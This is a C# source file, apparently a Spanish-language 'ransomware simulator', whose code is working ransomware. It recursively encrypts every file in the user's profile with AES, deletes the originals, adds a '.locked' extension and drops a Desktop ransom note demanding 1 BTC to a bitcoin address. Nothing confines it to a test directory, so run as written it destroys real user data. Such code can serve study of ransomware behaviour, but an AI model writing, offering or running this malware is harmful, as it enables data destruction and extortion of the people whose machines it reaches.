using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;

namespace RansomwareSim
{
    public static class RansomwareLogic
    {
        static string extension = ".locked";

        private static IEnumerable<string> SafeEnumerateFiles(string path, string searchPattern)
        {
            List<string> files = new List<string>();
            try
            {
                files.AddRange(Directory.GetFiles(path, searchPattern));
                foreach (var dir in Directory.GetDirectories(path))
                {
                    if (string.Equals(new DirectoryInfo(dir).Name, "ransomwareLocker", StringComparison.OrdinalIgnoreCase))
                        continue; // Ignorar carpeta especial
                    files.AddRange(SafeEnumerateFiles(dir, searchPattern));
                }
            }
            catch (UnauthorizedAccessException)
            {
                if (Program.DebugMode)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"⚠️ Acceso denegado a {path}");
                    Console.ResetColor();
                }
            }
            catch (PathTooLongException)
            {
                if (Program.DebugMode)
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine($"⚠️ Ruta demasiado larga: {path}");
                    Console.ResetColor();
                }
            }
            catch (Exception ex)
            {
                if (Program.DebugMode)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"⚠️ Error accediendo a {path}: {ex.Message}");
                    Console.ResetColor();
                }
            }
            return files;
        }

        public static void EncryptFiles(string key)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var files = SafeEnumerateFiles(userProfile, "*.*");

            foreach (string file in files)
            {
                try
                {
                    if (!file.EndsWith(extension) && !file.Contains("README_RESTORE_FILES.txt"))
                    {
                        byte[] content = File.ReadAllBytes(file);
                        byte[] encrypted = Encrypt(content, key);
                        File.WriteAllBytes(file + extension, encrypted);
                        File.Delete(file);

                        if (Program.DebugMode)
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"✅ Cifrado: {file}");
                            Console.ResetColor();
                        }
                    }
                }
                catch (Exception ex)
                {
                    if (Program.DebugMode)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"❌ Error cifrando {file}: {ex.Message}");
                        Console.ResetColor();
                    }
                }
            }
        }

        public static void DecryptFiles(string key)
        {
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var files = SafeEnumerateFiles(userProfile, "*" + extension);

            foreach (string file in files)
            {
                try
                {
                    byte[] content = File.ReadAllBytes(file);
                    byte[] decrypted = Decrypt(content, key);
                    string originalFile = file.Replace(extension, "");
                    File.WriteAllBytes(originalFile, decrypted);
                    File.Delete(file);

                    if (Program.DebugMode)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"✅ Descifrado: {originalFile}");
                        Console.ResetColor();
                    }
                }
                catch (Exception ex)
                {
                    if (Program.DebugMode)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"❌ Error descifrando {file}: {ex.Message}");
                        Console.ResetColor();
                    }
                }
            }
        }

        private static byte[] Encrypt(byte[] data, string key)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = AdjustKeyLength(Encoding.UTF8.GetBytes(key), 32);
                aes.GenerateIV();
                byte[] iv = aes.IV;

                using (var encryptor = aes.CreateEncryptor())
                {
                    byte[] encrypted = encryptor.TransformFinalBlock(data, 0, data.Length);
                    byte[] result = new byte[iv.Length + encrypted.Length];
                    Buffer.BlockCopy(iv, 0, result, 0, iv.Length);
                    Buffer.BlockCopy(encrypted, 0, result, iv.Length, encrypted.Length);
                    return result;
                }
            }
        }

        private static byte[] Decrypt(byte[] data, string key)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = AdjustKeyLength(Encoding.UTF8.GetBytes(key), 32);
                byte[] iv = new byte[aes.BlockSize / 8];
                byte[] encrypted = new byte[data.Length - iv.Length];

                Buffer.BlockCopy(data, 0, iv, 0, iv.Length);
                Buffer.BlockCopy(data, iv.Length, encrypted, 0, encrypted.Length);
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
                }
            }
        }

        private static byte[] AdjustKeyLength(byte[] key, int length)
        {
            byte[] adjustedKey = new byte[length];
            for (int i = 0; i < length; i++)
                adjustedKey[i] = i < key.Length ? key[i] : (byte)0;
            return adjustedKey;
        }

        public static void CreateRansomNote()
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string notePath = Path.Combine(desktop, "README_RESTORE_FILES.txt");
            string noteContent = @"
💀 Tus archivos han sido cifrados 💀

Todos tus documentos, fotos y videos están encriptados.
Para recuperarlos necesitas la clave secreta.

Envía 1 BTC a la siguiente dirección:
👉 1FfmbHfnpaZjKFvyi1okTjJJusN455paPH 👈

Después, envía un correo a: hacker@falsoemail.com

⚠️ Si no pagas en 24h perderás tus archivos para siempre.";

            File.WriteAllText(notePath, noteContent);
        }
    }
}
